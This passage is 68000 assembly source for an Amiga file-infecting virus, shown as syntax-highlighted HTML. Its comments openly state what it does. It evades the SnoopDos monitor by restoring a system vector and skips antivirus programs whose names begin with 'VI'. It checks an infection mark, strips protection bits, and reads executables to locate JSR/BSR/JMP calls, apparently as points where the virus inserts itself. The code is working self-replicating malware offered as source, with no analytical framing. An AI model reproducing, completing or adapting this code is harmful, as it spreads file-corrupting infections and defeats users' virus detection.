    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">get_locks</span><span class="sc0">

</span><span class="sc5">_kick_SnoopDos</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_ROM_putmsg</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">PutMsg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_get_disk_info</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">orig_PutMsg_vector</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">   </span><span class="sc1">;buffer_adress</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">_ROM_putmsg</span><span class="sc4">-</span><span class="sc5">orig_PutMsg_vector</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_get_disk_info</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">PutMsg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;store previous PutMsg() vector </span><span class="sc0">
                        </span><span class="sc1">;and temporary write original. </span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_ROM_putmsg</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">PutMsg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;that prevent virus detection</span><span class="sc0">
                        </span><span class="sc1">;by 'packet debugger' like in</span><span class="sc0">
                        </span><span class="sc1">;SnoopDos</span><span class="sc0">

</span><span class="sc5">_get_disk_info</span><span class="sc0">  
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d1</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">               </span><span class="sc1">;save this lock for later</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_InfoData</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">        </span><span class="sc1">;d1 - lock, d2 - InfoData</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">               
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">INFO</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">         </span><span class="sc1">;call Info()</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_id_diskstate</span><span class="sc4">-</span><span class="sc5">_InfoData</span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc2">82</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">              </span><span class="sc1">;validated ?</span><span class="sc0">
    </span><span class="sc5">bne.w</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_id_numblocks</span><span class="sc4">-</span><span class="sc5">_InfoData</span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc2">8000</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">            </span><span class="sc1">;blocks_total</span><span class="sc0">
    </span><span class="sc5">bmi.w</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">
    </span><span class="sc5">sub.l</span><span class="sc0">   </span><span class="sc5">_id_numblocksused</span><span class="sc4">-</span><span class="sc5">_InfoData</span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">  </span><span class="sc1">;blocks_used</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">100</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">d1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">               </span><span class="sc1">;free blocks &gt; 100 ?</span><span class="sc0">
    </span><span class="sc5">bmi.w</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">               </span><span class="sc1">;lock</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_filepath</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">               </span><span class="sc1">;buffer</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">120</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">             </span><span class="sc1">;length</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">NAMEFROMLOCK</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;extract path from lock</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a4</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">               </span><span class="sc1">;what you see</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">               </span><span class="sc1">;lock</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">EXAMINE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">         </span><span class="sc1">;call Examine()</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_check_file</span><span class="sc0">

</span><span class="sc5">_search_files</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d7</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">               </span><span class="sc1">;only lock is needed</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">EXNEXT</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">         </span><span class="sc1">;call Exnext()</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.b</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">

</span><span class="sc5">_check_file</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">_fib_direntrytype</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;file or dir?</span><span class="sc0">
    </span><span class="sc5">bpl.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">and.b</span><span class="sc0">   #</span><span class="sc5">%11</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">             </span><span class="sc1">;alinged to 4?</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">       </span><span class="sc1">;no, all Amiga execs have length</span><span class="sc0">
                    </span><span class="sc1">;BCPL*4</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">_fib_filename</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">and.w</span><span class="sc0">   #</span><span class="sc5">$dfdf</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc12">'VI'</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;VirusZ?, VirusExecutor?, VirusChecker?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">minimal_size</span><span class="sc4">,</span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bmi.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">maximal_size</span><span class="sc4">,</span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bhi.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">

    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc5">_fib_comment</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   </span><span class="sc5">_comment</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">     </span><span class="sc1">;check infection mark</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_date</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">LIF_date</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_date</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">LIF_date</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">LIF_size</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_search_files</span><span class="sc0">
        
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_fib_filename</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a1</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">           </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;dirname            </span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">120</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">         </span><span class="sc1">;max path length</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">ADDPART</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">     </span><span class="sc1">;add filename to path</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">     </span><span class="sc1">;call AddPart()</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">infect_file</span><span class="sc0">
    
</span><span class="sc5">_end_ExitCode_patch</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">          </span><span class="sc1">;execbase</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">orig_PutMsg_vector</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_end_ExitCode_patch2</span><span class="sc0">            </span><span class="sc1">;no :/</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">PutMsg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;yes, we found it</span><span class="sc0">
                    </span><span class="sc1">;now we replace our</span><span class="sc0">
                    </span><span class="sc1">;vector to previous code</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">

</span><span class="sc5">_end_ExitCode_patch2</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc4">-</span><span class="sc5">a6</span><span class="sc0">     </span><span class="sc1">;get regs back</span><span class="sc0">
</span><span class="sc1">;   rts</span><span class="sc0">

    </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc5">$4ef9</span><span class="sc0">
</span><span class="sc5">ExitCode_ptr</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">   
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_AllocVec</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_memory_allocated2</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc5">_memory_allocated2</span><span class="sc0">      
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">memory_ptr</span><span class="sc4">-</span><span class="sc5">_filepath</span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;save this ptr for later</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">           </span><span class="sc1">;----RWED</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">SETPROTECTION</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">   </span><span class="sc1">;clear all protection bits</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">     </span><span class="sc1">;call SetProtection()</span><span class="sc0">
    </span><span class="sc5">bmi.s</span><span class="sc0">   </span><span class="sc5">_protection_cleared</span><span class="sc0"> </span><span class="sc1">;is DOS TRUE?</span><span class="sc0">
                    </span><span class="sc1">;if not free memory and exit</span><span class="sc0">
</span><span class="sc5">_FreeVec</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">memory_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">clr.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">FreeVec</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc5">_protection_cleared</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a5</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;filename_ptr</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$3ed</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">        </span><span class="sc1">;mode OLD_FILE</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">OPEN</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">     </span><span class="sc1">;call Open()</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_opened</span><span class="sc0">         </span><span class="sc1">;opened...</span><span class="sc0">

</span><span class="sc5">_exit_infection</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">do_setprotection</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_FreeVec</span><span class="sc0">        </span><span class="sc1">;and free mem</span><span class="sc0">

</span><span class="sc5">_opened</span><span class="sc0"> 
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">d6</span><span class="sc0">           </span><span class="sc1">;save FH for all file operations</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">memory_ptr</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d2</span><span class="sc0">   </span><span class="sc1">;where to read the file</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_fib_size</span><span class="sc4">-</span><span class="sc5">_FileInfoBlock</span><span class="sc4">(</span><span class="sc5">a4</span><span class="sc4">),</span><span class="sc5">d3</span><span class="sc0"> </span><span class="sc1">;get file size</span><span class="sc0">

    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">READ</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;read whole file to allocated memory</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">     </span><span class="sc1">;call Read()</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_readed</span><span class="sc0">         </span><span class="sc1">;raeded</span><span class="sc0">

    </span><span class="sc5">bra.w</span><span class="sc0">   </span><span class="sc5">do_close</span><span class="sc0">
</span><span class="sc5">_close</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">           </span><span class="sc1">;FH</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">CLOSE</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_dos_caller</span><span class="sc0">     </span><span class="sc1">;call Close()</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc5">_readed</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">d5</span><span class="sc0">           </span><span class="sc1">;save readed_bytes for later</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc5">a2</span><span class="sc0">           </span><span class="sc1">;mem ptr</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">HUNK_START</span><span class="sc4">,(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;file is executable ?</span><span class="sc0">
    </span><span class="sc5">bne.w</span><span class="sc0">   </span><span class="sc5">do_close</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">),</span><span class="sc5">d4</span><span class="sc0">        </span><span class="sc1">;get number of hunks</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">,</span><span class="sc5">d4.w</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">HUNK_CODE</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;code hunk?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_hunk_code_found</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">HUNK_DATA</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;data_hunk? (equal to code_hunk)</span><span class="sc0">
    </span><span class="sc5">bne.w</span><span class="sc0">   </span><span class="sc5">do_close</span><span class="sc0">

</span><span class="sc5">_hunk_code_found</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">),</span><span class="sc5">d4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">,</span><span class="sc5">d4.l</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">     </span><span class="sc1">;adress of the end of the hunk</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a1</span><span class="sc4">,</span><span class="sc5">a3</span><span class="sc0">           </span><span class="sc1">;save it for later</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$3ff0</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">       </span><span class="sc1">;search_range</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc5">d4</span><span class="sc0">
    </span><span class="sc5">bgt.s</span><span class="sc0">   </span><span class="sc5">_use_3ffO</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d4</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">lsl.l</span><span class="sc0">   #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">subq.l</span><span class="sc0">  #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc5">$dff007</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc5">and.w</span><span class="sc0">   #</span><span class="sc5">$f</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">
    </span><span class="sc5">addq.w</span><span class="sc0">  #</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">

</span><span class="sc5">_use_3ffO</span><span class="sc0">
    </span><span class="sc1">;================================= "JSR scanner" ============</span><span class="sc0">

    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d4</span><span class="sc0">
    
</span><span class="sc5">search_JSR</span><span class="sc0">
    </span><span class="sc5">addq.w</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">-(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">NULL_check</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$4eae</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">; jsr xxyy(a6)?</span><span class="sc0">
    </span><span class="sc5">beq.b</span><span class="sc0">   </span><span class="sc5">jsr_found</span><span class="sc0">       </span><span class="sc1">; Yes !</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$6100</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">; bsr.w xxxx?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">bsr_found</span><span class="sc0">       </span><span class="sc1">; Yea !</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$4eba</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">; jsr xxyy(pc)?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">jsr_found</span><span class="sc0">       </span><span class="sc1">; Yepp</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$4efa</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">; jmp xxyy(pc)?</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">jmp_found</span><span class="sc0">       </span><span class="sc1">; Da</span><span class="sc0">

</span><span class="sc5">search_JSR_loop</span><span class="sc0">
    </span><span class="sc5">dbra</span><span class="sc0">    </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc5">search_JSR</span><span class="sc0">
